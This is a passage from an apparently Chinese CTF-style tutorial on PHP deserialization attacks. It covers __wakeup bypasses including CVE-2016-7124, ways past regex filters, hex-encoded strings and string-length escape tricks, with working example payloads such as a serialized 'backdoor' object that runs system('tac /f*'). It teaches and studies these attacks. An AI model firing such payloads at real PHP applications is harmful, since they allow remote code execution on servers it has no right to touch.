class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">__invoke<br></code></pre></td></tr></table></figure><h1 id="反序列化绕过的几种方法"><a href="#反序列化绕过的几种方法" class="headerlink" title="反序列化绕过的几种方法"></a>反序列化绕过的几种方法</h1><h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><blockquote><p>利用条件：<br>PHP5 &lt; 5.6.25<br>​PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$v = new test();</span><br><span class="hljs-comment">//echo serialize($v);</span><br><span class="hljs-comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>时会返回<code>aaa</code>，在修改对象属性个数的值，执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>会返回<code>test</code></p><h3 id="利用反序列化字符串报错"><a href="#利用反序列化字符串报错" class="headerlink" title="利用反序列化字符串报错"></a>利用反序列化字符串报错</h3><p>利用一个包含<code>__destruct</code>方法的类触发魔术方法可绕过<code>__wakeup</code>方法</p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get(<span class="hljs-subst">$name</span>)\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>原本应该是<code>O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;</code><br>调用顺序是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">D::<span class="hljs-variable constant_">__wakeup</span><br>C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>添加了一个<code>;N;</code>(反序列化末尾加上<code>;任意字符;</code>)的错误结构后调用顺序就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__wakeup</span><br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>来自Article_kelp师傅的原理解释，orz：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.jpg"></p><h3 id="使用C代替O"><a href="#使用C代替O" class="headerlink" title="使用C代替O"></a>使用C代替O</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YAje0</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));<br></code></pre></td></tr></table></figure><p>比较鸡肋，只能执行<code>construct()</code>和<code>destruct()</code>函数，无法添加任何内容</p><h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><h3 id="检测’O’"><a href="#检测’O’" class="headerlink" title="检测’O’"></a>检测’O’</h3><blockquote><p>利用条件：<br>preg_match(‘&#x2F;^O:\d+&#x2F;i’,$data)</p></blockquote><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/i&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;object not allow unserialize&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用方式1：当在代码中使用类似<code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>的正则语句来匹配是否是对象字符串开头的时候，可以使用<code>+</code>绕过</p><p><code>O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code><br><code>O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code></p><p>要注意在<code>url</code>里传参时<code>+</code>要编码为<code>%2B</code></p><p>利用方式2：使用<code>array()</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backdoor</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="检测’-’"><a href="#检测’-’" class="headerlink" title="检测’}’"></a>检测’}’</h3><p>有时候会遇到另一种正则，比如<code>/\&#125;$/</code>，会匹配最后一个<code>&#125;</code></p><p>反序列化字符串末尾的<code>&#125;&#125;&#125;&#125;</code>是可以全部删掉的，没有影响</p><p>比如<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;</code></p><p>变成<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;</code></p><p>甚至在末尾填充字符<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa</code></p><p>均能正常解析</p><h3 id="检测数字"><a href="#检测数字" class="headerlink" title="检测数字"></a>检测数字</h3><p>可以用字符<code>i</code>、<code>d</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h2><p>利用方式：当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使<code>$a</code>永远与<code>$b</code>相等</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$this-&gt;b = &amp;$this-&gt;a;</code>表示<code>$b</code>变量指向的地址永远指向<code>$a</code>变量指向的地址</p><h2 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h2><p>利用方式：当代码中存在关键词检测时，将表示字符类型的<code>s</code>改为大写来绕过检测</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果过滤了关键字<code>admin</code>，可以将其替换成<code>O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;</code></p><p>表示字符类型的s为大写时，就会被当成16进制解析</p><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于<code>php</code>在进行反序列化时，是从左到右读取，读取多少取决于<code>s</code>后面的字符长度，且认为读到<code>&#125;</code>就结束了，<code>&#125;</code>后面的字符不会有影响</p><p>一般触发字符逃逸的条件是替换函数<code>str_replace</code>，使字符串长度改变，造成字符逃逸，读取到不一样的数据</p><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以发现结果中的<code>aaa</code>被替换成了<code>aaaa</code>，但是长度值没变，还是<code>3</code>，这就导致多出了一个<code>a</code>，而且值是可控的，我们可以将这部分值变为 <code>很多aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;</code>， <code>很多aaa</code>的具体个数取决于后面想要构造的字符串的长度，这里是<code>21</code>位，就用<code>21</code>组<code>aaa</code>，这样替换后会多出<code>21</code>个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$b</code>的值成功被修改成了<code>qaq</code></p><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><p>原理与<code>过滤后字符变多</code>大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要注意闭合就行了，与sql注入类似</p><h2 id="类属性不敏感"><a href="#类属性不敏感" class="headerlink" title="类属性不敏感"></a>类属性不敏感</h2><p>对于<code>PHP</code>版本<code>7.1+</code>，对属性的类型不敏感</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 